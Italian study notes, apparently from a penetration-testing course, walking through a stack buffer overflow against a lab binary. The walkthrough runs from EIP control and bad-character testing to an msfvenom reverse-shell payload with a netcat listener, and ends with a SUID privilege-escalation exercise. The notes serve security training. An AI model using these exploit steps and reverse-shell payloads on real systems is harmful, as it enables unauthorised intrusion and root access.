# Teoria







# Exploit

Passi:
1. Prendere il controllo del registro EIP
2. Determinare la lunghezza del payload
3. Identificare eventuali caratti malevoli 
4. Generazione del payload
5. Trovare l'indirizzo di ritorno 
6. Esecuzione


## Prendere il controllo del registro EIP
Uno degli aspetti più importanti di un buffer overflow basato sullo stack è quello di tenere sotto controllo il puntatore all'istruzione (EIP), in modo da potergli dire a quale indirizzo deve saltare. In questo modo l'EIP punterà all'indirizzo da cui parte il nostro shellcode e la CPU lo eseguirà.

Possiamo eseguire i comandi in GDB usando Python, che ci serve direttamente come input.

```shell
$ gdb -q bow32
(gdb) run $(python -c "print '\x55' * 1200")
```
EIP e' stato sovrascritto. Se non dovesse essere cosi, aumentiamo la quantita' di caratteri.

```shell
(gdb) info registers 

eax            0x1	1
ecx            0xffffd6c0	-10560
edx            0xffffd06f	-12177
ebx            0x55555555	1431655765
esp            0xffffcfd0	0xffffcfd0
ebp            0x55555555	0x55555555		# <---- EBP overwritten
esi            0xf7fb5000	-134524928
edi            0x0	0
eip            0x55555555	0x55555555		# <---- EIP overwritten
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```
Ciò significa che dobbiamo accedere in scrittura all'EIP. Questo, a sua volta, permette di specificare a quale indirizzo di memoria l'EIP deve saltare. Tuttavia, per manipolare il registro, abbiamo bisogno di un numero esatto di 'U' fino all'EIP, in modo che i 4 byte successivi possano essere sovrascritti con l'indirizzo di memoria desiderato.

### Determinare la lunghezza dell'offset

L'offset viene utilizzato per determinare quanti byte sono necessari per sovrascrivere il buffer e quanto spazio abbiamo a disposizione per il nostro shellcode.

Lo shellcode è un codice di programma che contiene le istruzioni per un'operazione che vogliamo far eseguire alla CPU. La creazione manuale dello shellcode sarà discussa in dettaglio in altri moduli. Ma per risparmiare tempo, prima utilizziamo il Metasploit Framework (MSF) che offre uno script Ruby chiamato "pattern_create" che può aiutarci a determinare il numero esatto di byte per raggiungere l'EIP. Crea una stringa unica basata sulla lunghezza dei byte specificati per aiutare a determinare l'offset.

```shell
# creazione del pattern 
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
```
Ora sostituiamo le nostre 1200 "U" con i modelli generati e concentriamo nuovamente la nostra attenzione sull'EIP.

```shell
# uso del pattern appena generato
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()

(gdb) info registers eip
eip            0x69423569	0x69423569
```

Vediamo che l'EIP visualizza un indirizzo di memoria diverso e possiamo usare un altro strumento MSF chiamato "pattern_offset" per calcolare il numero esatto di caratteri (offset) necessari per passare all'EIP.

```shell
# calcolo preciso delle dimensioni dell'offset
# 0x69423569 e' l'indirizzo di memoria trovato ispezionando il binario con (gdb) info registers eip
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
[*] Exact match at offset 1036
```
Se ora utilizziamo esattamente questo numero di byte per le nostre "U", dovremmo arrivare esattamente sull'EIP. Per sovrascriverlo e verificare se lo abbiamo raggiunto come previsto, possiamo aggiungere altri 4 byte con "\x66" ed eseguirlo per assicurarci di controllare l'EIP.

```shell
# il valore exact_match e' restituito in output da
# $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
# dove 0x69423569 e' l'indirizzo di memoria trovato ispezionando il binario con (gdb) info registers eip
# dopo aver runnato il binaro con il payload
(gdb) run $(python -c "print '\x55' * <exact_match> + '\x66' * 4")

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()

(gdb) info registers eip
eip            0x66666666       0x66666666
```
Ora vediamo che abbiamo sovrascritto l'EIP con i nostri caratteri "\x66". 

```shell
# risultato attesto
(gdb) info registers eip
eip            0x66666666       0x66666666
```

## Determinare la lunghezza del shellcode

Ora dobbiamo scoprire quanto spazio abbiamo a disposizione per il nostro shellcode per eseguire l'azione che vogliamo. È di moda e utile sfruttare questa vulnerabilità per ottenere una reverse shell. Per prima cosa, dobbiamo scoprire quanto sarà grande lo shellcode che inseriremo e per questo useremo `msfvenom`.

```shell
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<MYIP> lport=31337 --platform linux --arch x86 --format c > shellcode
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
```

Ora sappiamo che il nostro payload sarà di circa `68 byte`. Per precauzione, dovremmo cercare di prendere un intervallo più grande se lo shellcode aumenta a causa di specifiche successive.

Spesso può essere utile inserire qualche `no operation instruction` (`NOPS`) prima dell'inizio del nostro shellcode, in modo che possa essere eseguito in modo pulito. Riassumiamo brevemente ciò di cui abbiamo bisogno:

- Abbiamo bisogno di un totale di `1040 byte` per arrivare all'`EIP`. (exact_match + 4)
- In questo caso, possiamo utilizzare altri `100 byte` di `NOP`. (un po di padding che non guasta mai)
- `150 byte` per il nostro shellcode. (esageriamo un po la dimensione reale di 68 byte)

```shell
    Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786

      NOPs = "\x90" * 100
 Shellcode = "\x44" * 150
       EIP = "\x66" * 4
```

Ora possiamo cercare di capire quanto spazio abbiamo a disposizione per inserire il nostro shellcode.

```shell
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()

# risultato atteso
(gdb) info registers eip
eip            0x66666666       0x66666666
```

Se l'EIP ha esattamente i byte che ci aspettiamo abbiamo fatto i conti giusti XD! Abbiamo uno spazio totale di 250bytes per lo shellcode (dimensione reale aumentata 150 + nops 100).

## Identificare eventuali caratti malevoli 

In precedenza, nei sistemi operativi UNIX, i file binari iniziavano con due byte contenenti un `numero magico` che determinava il tipo di file. All'inizio questo veniva usato per identificare i file oggetto per le diverse piattaforme. Gradualmente questo concetto è stato trasferito ad altri file e ora quasi tutti i file contengono un numero magico.

Tali caratteri riservati esistono anche nelle applicazioni, ma non sono sempre presenti e non sono sempre gli stessi. Questi caratteri riservati, noti anche come `caratteri negativi`, possono variare, ma spesso si vedono caratteri come questo:

- `\x00` Byte nullo
- `\x0A` Avanzamento di riga
- `\x0D` Ritorno a capo
- `\xFF` Avanzamento di forma

Utilizziamo il seguente elenco di caratteri per scoprire tutti i caratteri che dobbiamo considerare ed evitare quando generiamo il nostro codice shell.

```shell
$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

Per calcolare il numero di byte nella nostra variabile CHARS, possiamo usare bash sostituendo la "\x" con uno spazio e poi usare wc per contare le parole.

```shell
# questo test conviene farlo sulla macchina vittima (su kali wc -w non da lo stesso risultato)
$ echo $CHARS | sed 's/\\x/ /g' | wc -w
256
```

Questa stringa è lunga 256 byte. Dobbiamo quindi calcolare nuovamente il nostro buffer.

```shell
Buffer = "\x55" * (1040 - 256 - 4) = 780

 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```

Ora diamo un'occhiata all'intera funzione principale. Perché se la eseguiamo ora, il programma si bloccherà senza darci la possibilità di seguire ciò che accade nella memoria. Impostiamo quindi un punto di interruzione nella funzione corrispondente, in modo che l'esecuzione si fermi a questo punto e si possa analizzare il contenuto della memoria.

```shell
(gdb) disas main

(gdb) break bowfunc # la funziona va trovata disas main

(gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
/bin/bash: warning: command substitution: ignored null byte in input

Breakpoint 1, 0x56555551 in bowfunc ()

(gdb) x/2000xb $esp+500

0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
				  # |---> "\x55"s begin
0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
<SNIP>
```

Qui riconosciamo a quale indirizzo inizia il nostro "\x55". Da qui possiamo andare più in basso e cercare il punto in cui inizia il nostro CHARS.

```shell
<SNIP>
0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
												  # |---> CHARS begin
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
<SNIP>
```

Vediamo dove finisce il nostro `\x55` e dove inizia la variabile `CHARS`. Ma se la osserviamo da vicino, vedremo che inizia con `\x01` invece che con `\x00`. Abbiamo già visto l'avviso durante l'esecuzione che il `null byte` nel nostro input è stato ignorato.

Possiamo quindi prendere nota di questo carattere, rimuoverlo dalla nostra variabile CHARS e regolare il numero del nostro `\x55`.

```shell
# Substract the number of removed characters
Buffer = "\x55" * (1040 - 255 - 4) = 781

# "\x00" removed: 256 - 1 = 255 bytes
  CHARS = "\x01\x02\x03...<SNIP>...\xfd\xfe\xff"
    EIP = "\x66" * 4
```

continuiamo questa operazione fino a trovare tutti i caratteri che saltano e di volta in volta aggiorniamo la dimensione del buffer e riproviamo rimuovendo il byte che da fastidio. 

Prendiamo nota dei caratteri eliminati perche' servirano nella fase sucessiva di generazione della shellcode. In questo caso sono `\x00\x09\x0a\x20`

## Generazione del shellcode

Abbiamo già conosciuto lo strumento `msfvenom` con il quale abbiamo generato la lunghezza approssimativa del nostro shellcode. Ora possiamo utilizzare nuovamente questo strumento per generare lo shellcode vero e proprio, che fa eseguire alla CPU del nostro sistema di destinazione il comando desiderato.

Ma prima di generare il nostro shellcode, dobbiamo assicurarci che i singoli componenti e le proprietà corrispondano al sistema di destinazione. Pertanto, dobbiamo prestare attenzione alle seguenti aree:

- Architettura
- Piattaforma
- Bad Characters

```shell
$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
Saved as: shellcode
```
Aggiorniamo i conti con la dimensione di questo payload

```shell
   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817

     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4
```

```shell
# usiamo lo shellcode generato
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
# Next, we check if the first bytes of our shellcode match the bytes after the NOPS.
(gdb) x/2000xb $esp+550

0xffffd726:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd72e:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd736:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd73e:     0x90    0x90    0x90    0x90    0x90    0xb8    0x69    0x9d
                                                      # | ---> shellcode
0xffffd746:     0x19    0x43    0xda    0xc3    0xd9    0x74    0x24    0xf4
0xffffd74e:     0x5b    0x33    0xc9    0xb1    0x12    0x31    0x43    0x12
0xffffd756:     0x03    0x43    0x12    0x83    0xaa    0x99    0xfb    0xb6
0xffffd75e:     0x1d    0x79    0x0c    0xdb    0x0e    0x3e    0xa0    0x76

```




## Trovare l'indirizzo di ritorno 


Dopo aver verificato che controlliamo ancora l'`EIP` con il nostro `shellcode`, ora abbiamo bisogno di un indirizzo di memoria in cui si trovano le nostre `NOP` per dire all'EIP di saltare ad esso. Questo indirizzo di memoria non deve contenere nessuno dei caratteri difettosi trovati in precedenza.

```shell
# individuiamo due punti:

# dove finiscono gli \x55 e iniziano gli \x90
# dove finiscono gli \x90 ed inizia lo shellcode

# scegliamo un indirizzo di memoria in questo intervallo

(gdb) x/2000xb $esp+1400

```
Dopo aver selezionato un indirizzo di memoria, sostituiamo il nostro "\x66" che sovrascrive l'EIP per dirgli di saltare all'indirizzo scelto, in questo esempio `0xffffd64c`. Si noti che l'inserimento dell'indirizzo viene fatto al contrario.

```shell
   Buffer = "\x55" * (1040 - 100 - 95 - 4) = 841

     NOPs = "\x90" * 100
Shellcode = "\xda\xca\xba...<SNIP>...\x5a\x22\xa2"
      EIP = "\x4c\xd6\xff\xff"
```


## Esecuzione
Poiché il nostro codice shell crea una shell inversa, lasciamo che `netcat` ascolti la porta `31337`.

```shell
$ nc -nlvp 31337

```

Dopo aver avviato `netcat`, eseguiamo nuovamente il nostro exploit adattato, che innesca la CPU per connettersi a `netcat`.

```shell
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```

e nella shell con `netcat` abbiamo la connesione!

# Prevenzione

# Skill Assessment

Siamo riusciti a ottenere l'accesso SSH a una macchina Linux la cui password è stata riutilizzata da un'altra macchina durante il nostro test di penetrazione.

Su questa macchina, abbiamo un utente standard "htb-student" che può lasciare un messaggio all'amministratore utilizzando un programma scritto in proprio chiamato "leave_msg". Poiché l'azienda target presta molta attenzione alla difesa dall'esterno della rete e l'aspetto dell'amministratore mostrava un'elevata fiducia in se stesso, ciò potrebbe indicare che la sicurezza locale è stata trascurata.

Dopo le nostre ricerche, abbiamo scoperto che questi messaggi sono memorizzati in "/htb-student/msg.txt", che è binario di proprietà dell'utente root e il bit SUID è impostato.

Esaminate il programma e scoprite se è vulnerabile a un buffer overflow basato su stack. Se avete trovato la vulnerabilità, usatela per leggere il file "/root/flag.txt" presente nel sistema come prova.